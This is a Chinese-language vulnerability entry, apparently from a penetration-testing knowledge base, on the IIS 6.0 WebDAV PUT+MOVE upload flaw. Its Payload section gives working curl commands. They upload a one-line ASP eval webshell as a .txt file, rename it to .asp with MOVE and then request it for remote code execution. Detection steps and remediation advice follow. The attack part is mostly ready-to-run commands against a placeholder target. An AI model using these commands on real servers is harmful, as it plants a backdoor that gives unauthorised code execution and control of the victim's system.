---
id: IIS-WEBDAV-PUT
title: IIS WebDAV PUT+MOVE 文件上传漏洞
product: iis
vendor: Microsoft
version_affected: "6.0"
severity: CRITICAL
tags: [rce, file_upload, webdav, put_method, 无需认证]
fingerprint: ["Microsoft-IIS", "IIS"]
---

## 漏洞描述

IIS 6.0 开启 WebDAV 扩展后，攻击者可通过 PUT 方法上传文本文件（如 `.txt`），再通过 MOVE 方法将文件重命名为可执行脚本（如 `.asp`），绕过文件上传限制实现远程代码执行。

## 影响版本

- IIS 6.0（开启 WebDAV）

## 前置条件

- 无需认证（或 WebDAV 匿名写入已启用）
- 目标 IIS 开启了 WebDAV 扩展
- Web 目录具有写入权限

## 利用步骤

1. 检测 WebDAV 是否启用（OPTIONS 请求）
2. 使用 PUT 方法上传包含 webshell 代码的 `.txt` 文件
3. 使用 MOVE 方法将 `.txt` 文件重命名为 `.asp`
4. 访问重命名后的 `.asp` 文件获得代码执行

## Payload

```bash
# 检测 WebDAV
curl -X OPTIONS http://TARGET -I | grep -iE "Allow|DAV"
davtest -url http://TARGET

# Step 1: PUT 上传 txt 文件（含 ASP webshell 代码）
curl -X PUT http://TARGET/shell.txt -d "<%eval request(\"cmd\")%>"

# Step 2: MOVE 改名为 asp
curl -X MOVE http://TARGET/shell.txt -H "Destination: http://TARGET/shell.asp"

# Step 3: 访问 webshell
curl "http://TARGET/shell.asp"
```

## 验证方法

```bash
# 检查 WebDAV 是否启用
curl -sI -X OPTIONS http://TARGET | grep -iE "Allow|DAV"
# 如果 Allow 包含 PUT、MOVE 且响应含 DAV 头，则可能存在漏洞

# 使用 davtest 自动检测可上传的文件类型
davtest -url http://TARGET
```

## 修复建议

1. 禁用 WebDAV 扩展（若业务不需要）
2. 升级到高版本 IIS
3. 限制 Web 目录的写入权限
4. 禁止 PUT、MOVE 等危险 HTTP 方法
